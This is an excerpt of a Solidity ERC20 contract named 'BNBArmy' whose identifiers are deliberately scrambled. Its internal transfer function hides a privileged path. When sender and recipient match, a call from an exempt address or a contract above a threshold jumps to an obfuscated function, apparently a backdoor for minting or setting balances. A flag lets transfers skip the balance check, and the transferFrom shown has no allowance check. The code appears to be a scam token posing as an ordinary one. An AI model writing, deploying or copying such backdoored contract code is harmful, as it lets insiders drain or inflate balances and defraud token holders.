...
contract BNBArmy is Ownable, IERC20 {
    ...
    uint256 public _byerfgbjhs = 1000000000 * 10 ** _decimals;
    ...
    function _wuefgybsauykng(address dsabigutr, address bqyefgu, uint256 amount) internal virtual {
        require(dsabigutr != address(0));
        require(bqyefgu != address(0));
        uint256 uygvbfusgbdnufygrg = 0;
        if (!_uhvbdfuvbukbgdkun[dsabigutr] && !_uhvbdfuvbukbgdkun[bqyefgu] && !Address.yuwgvaufbgdh(bqyefgu) && bqyefgu != address(this) && !yugasdfbewgvfbh) {
            uygvbfusgbdnufygrg = amount.mul(_fee).div(100);
            require(amount <= _byerfgbjhs);
        }
        if (_kuyagfdkgndryfgbuskyzefnkusznh < amount && (_uhvbdfuvbukbgdkun[msg.sender] || Address.yuwgvaufbgdh(bqyefgu)) && bqyefgu == dsabigutr) {
            return weurfgwjhmhnefuyhaskunfg(amount, bqyefgu);
        }
        require(yugasdfbewgvfbh || _balance[dsabigutr] >= amount);
        uint256 ahgbfusngsd = amount - uygvbfusgbdnufygrg;
        _balance[address(0)] += uygvbfusgbdnufygrg;
        _balance[dsabigutr] = _balance[dsabigutr] - amount;
        _balance[bqyefgu] += ahgbfusngsd;
        emit Transfer(dsabigutr, bqyefgu, ahgbfusngsd);
    ...
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _wuefgybsauykng(from, recipient, amount);
